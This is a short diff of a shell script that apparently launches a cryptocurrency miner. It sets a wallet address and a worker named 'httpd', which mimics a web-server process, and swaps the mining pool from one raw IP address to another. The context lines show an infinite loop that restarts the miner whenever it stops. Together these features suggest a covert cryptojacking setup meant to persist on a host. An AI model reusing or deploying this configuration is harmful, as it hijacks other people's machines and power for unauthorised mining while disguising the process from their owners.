@@ -3,7 +3,7 @@
 # Wallet and worker configuration
 WALLET="0x1bE17413356722a411033303EF7D8A13768fdF83"
 WORKER="httpd"
-POOL_URL="stratum+tcp://$WALLET.$WORKER@146.103.45.69:8080"
+POOL_URL="stratum+tcp://$WALLET.$WORKER@154.39.80.86:32672"
 
 # Infinite loop to restart the miner if it stops
 while true; do
